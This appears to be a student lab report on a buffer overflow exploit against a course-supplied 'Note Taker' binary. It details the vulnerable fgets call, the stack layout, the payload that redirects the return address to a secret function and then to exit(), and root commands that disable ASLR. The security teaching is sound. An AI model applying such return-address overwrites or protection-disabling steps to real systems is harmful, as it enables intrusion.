# CMPUT 333 Assignment 3 — Buffer Overflow Exploit Report
**Group 9**

---

## 1. What the Program Does

`vulnprog` is a stripped **x86-64** ELF PIE binary that implements a simple "Note Taker" application. On startup it prints a message acknowledging 23 hidden secret functions, then presents a menu:

```
=== Note Taker ===
1. Add note
2. Edit note
3. View note
4. Quit
```

Internally the binary contains 23 secret functions (one per group) in `.text`, each of which calls `puts()` to print a message of the form `SECRET CMPUT 333 Group NN reached`. These functions are never called by normal program flow.

---

## 2. Vulnerability: Buffer Overflow in "Edit Note"

### Discovery

The vulnerable function is the "Edit note" helper at `PIE+0x149f`. Its stack frame is set up with:

```asm
push   rbp
mov    rbp, rsp
sub    rsp, 0xb0          ; allocates 176-byte frame
```

Inside the function, a call to `fgets` was identified:

```asm
lea    rax, [rbp-0x40]    ; buffer starts at rbp-64
mov    edx, stdin_ptr
mov    esi, 0x80          ; size argument = 128
mov    rdi, rax
call   fgets@plt
```

The buffer is only **64 bytes** (`rbp-0x40`), but `fgets` is told to read up to **128 bytes**. This is an off-by-factor-of-two buffer overflow.

### Stack Layout at the Overflow Point

```
Address         Contents
─────────────────────────────────────────────────────
[rbp - 0xa8]    saved notes[idx] pointer (arg)
[rbp - 0xa0]    strncpy scratch area (~160 bytes)
[rbp - 0x40]    fgets destination buffer  ← 64 bytes allocated
[rbp + 0x00]    saved rbp                 ← overwritten at offset 64
[rbp + 0x08]    return address            ← overwritten at offset 72  ← TARGET
[rbp + 0x10]    (next frame)              ← overwritten at offset 80
```

`fgets` reads until a newline (`0x0a`) or EOF, writing up to 127 bytes followed by a null terminator. Writing 72 bytes reaches the saved return address exactly.

### Additional Constraint

Before saving the edited note, the helper calls `strchr(input, '!')`. If a `!` (byte `0x21`) is found in the input, the write is rejected. Therefore the payload must not contain byte `0x21` or byte `0x0a`.

---

## 3. Locating the Secret Functions

### Step 1 — Find the strings in `.rodata`

Parsing the ELF binary, the `.rodata` section was scanned for the pattern `SECRET CMPUT 333 Group`. The 23 strings were found starting at file offset `0x2008`, spaced `0x28` bytes apart:

```
0x2008  "SECRET CMPUT 333 Group 01 reached"
0x2030  "SECRET CMPUT 333 Group 02 reached"
...
0x2370  "SECRET CMPUT 333 Group 23 reached"
```

### Step 2 — Find the functions in `.text`

Each string is referenced by exactly one `lea rax, [rip+X]` instruction. Scanning `.text` for the byte sequence `48 8d 05` (the `lea rax, [rip+disp32]` encoding) and computing the target addresses identified 23 references — one per group string.

Back-tracing each `lea` to the nearest preceding `endbr64` (`f3 0f 1e fa`) preamble identified the function entry points.

### Step 3 — Verify the pattern

All 23 functions share an identical 26-byte (`0x1a`) structure:

```asm
f3 0f 1e fa          endbr64
55                   push   rbp
48 89 e5             mov    rbp, rsp
48 8d 05 XX XX XX XX lea    rax, [rip + <group string>]
48 89 c7             mov    rdi, rax
e8 XX XX XX XX       call   puts@plt
90                   nop
5d                   pop    rbp
c3                   ret
```

They are contiguous in memory with a fixed stride of `0x1a` bytes, starting at `PIE+0x1249`:

```
Group  1: PIE + 0x1249
Group  2: PIE + 0x1263
...
Group  N: PIE + 0x1249 + (N-1) * 0x1a
...
Group  9: PIE + 0x1249 + 8 * 0x1a = PIE + 0x1319
Group 23: PIE + 0x1249 + 22 * 0x1a = PIE + 0x1497
```

---

## 4. Address Resolution

With ASLR disabled (`/proc/sys/kernel/randomize_va_space = 0`), a PIE binary always maps to the same base address on Ubuntu 24.04 x86-64:

```
PIE base: 0x555555554000
```

Confirmed with:
```bash
gdb -batch -ex 'starti' -ex 'info proc mappings' ./vulnprog
```

The `exit()` address in libc is detected dynamically by `exploit.py` at runtime using GDB:

```bash
gdb -batch -q \
    -ex 'set breakpoint pending on' \
    -ex 'break puts' \
    -ex 'run' \
    -ex 'print (void*)exit' \
    ./vulnprog < /dev/null
```

`break puts` is used instead of `break main` because the binary is stripped (no `main` symbol). On the bof-vuln VM this resolves to `0x7ffff7c47ba0`; on other systems the address differs but is found automatically.

For Group 9 (bof-vuln VM example):
```
Secret function = 0x555555554000 + 0x1319 = 0x555555555319
exit()          = 0x7ffff7c47ba0  (varies by VM; detected at runtime)
```

Both addresses are free of bytes `0x0a` and `0x21`.

---

## 5. Exploit Design

### Payload Structure (88 bytes)

```
Offset  Size  Content
──────────────────────────────────────────────────────
 0      64    'A' × 64        fills the 64-byte fgets buffer
64       8    'B' × 8         overwrites saved rbp (value irrelevant)
72       8    0x555555555319  overwrites return address → Group 9 secret function
80       8    exit() address  overwrites [rbp+0x10] → exit() (detected at runtime)
```

Total: 88 bytes, well within fgets' 127-byte limit.

### Full Input Sent to the Program

```
"2\n"          selects menu option 2 (Edit note)
"0\n"          selects note index 0
<88-byte payload>
"\n"           terminates the fgets read
```

### Execution Flow

1. The "Edit note" handler calls `fgets(rbp-0x40, 128, stdin)`.
2. The payload fills the 64-byte buffer, overwrites saved rbp with `BBBBBBBB`, and places the Group 9 secret function address at `[rbp+0x08]` (the return address slot).
3. The handler executes `leave; ret`, loading the secret function address into `rip`.
4. The secret function executes:
   - `push rbp` — pushes a new frame
   - `lea rax, [rip+<string>]` / `mov rdi, rax` — loads the group string address
   - `call puts@plt` — prints `SECRET CMPUT 333 Group 09 reached`
   - `pop rbp` / `ret` — pops the frame and returns
5. At `ret`, `rsp` points to `[rbp+0x10]` in the original frame — where we placed `exit()`.
6. `exit()` is called, terminating the process cleanly.

---

## 6. Running the Exploit

### Prerequisites

- Ubuntu 24.04 x86-64 (WSL2 or VM)
- ASLR disabled (requires root):
  ```bash
  echo 0 > /proc/sys/kernel/randomize_va_space
  ```
- `python3` and `./vulnprog` present

### Setup (one time, as root)

```bash
sudo bash setup_vm.sh
```

### Run

```bash
python3 exploit.py | ./vulnprog
```

Or using the convenience wrapper:

```bash
bash run_exploit.sh 9
```

### Expected Output

```
SECRET CMPUT 333 Group 09 reached
```

Exit status: 16 (non-zero but clean — no crash, no signal. exit() is called with rdi still pointing to the group string, resulting in a non-zero status).

---

## 7. Files Submitted

| File | Purpose |
|------|---------|
| `exploit.py` | Main exploit — builds and sends the overflow payload |
| `run_exploit.sh` | Convenience wrapper to run the exploit for any group number |
| `setup_vm.sh` | One-time environment setup (ASLR disable, package install) |
| `cloud-config.yaml` | Multipass cloud-init config — installs packages and disables ASLR on VM launch |
| `README.md` | Step-by-step instructions to recreate the exploit from a clean VM |
| `find_base.py` | Helper to verify the PIE base address via GDB |
| `report.md` | This report |
| `cmput333_group9_bof.txt` | Full terminal session captured with the `script` command |
| `1.png` | GDB `info proc mappings` confirming PIE base `0x555555554000` |
| `2.png` | GDB `print (void*)exit` confirming `exit()` address |
| `3.png` | Exploit run showing `SECRET CMPUT 333 Group 09 reached` |

---

## 8. Evidence

### Terminal Session

The file `cmput333_group9_bof.txt` contains the full terminal session recorded with the `script` command inside the `bof-vuln` Multipass VM. It covers:
- ASLR confirmation (`cat /proc/sys/kernel/randomize_va_space` → `0`)
- Binary inspection (`file ./vulnprog`)
- PIE base verification via GDB (`info proc mappings`)
- `exit()` address confirmation via GDB (`print (void*)exit`)
- The exploit run with the expected output

### Screenshots

All screenshots are watermarked with date/time and Group 9.

**1.png** — GDB `info proc mappings` output confirming the binary loads at `0x555555554000` with ASLR disabled.

**2.png** — GDB `print (void*)exit` output confirming `exit()` is at `0x7ffff7c47ba0` in libc on Ubuntu 24.04.

**3.png** — The exploit being run with `python3 exploit.py | ./vulnprog`, showing the program output including `SECRET CMPUT 333 Group 09 reached` and a clean exit.
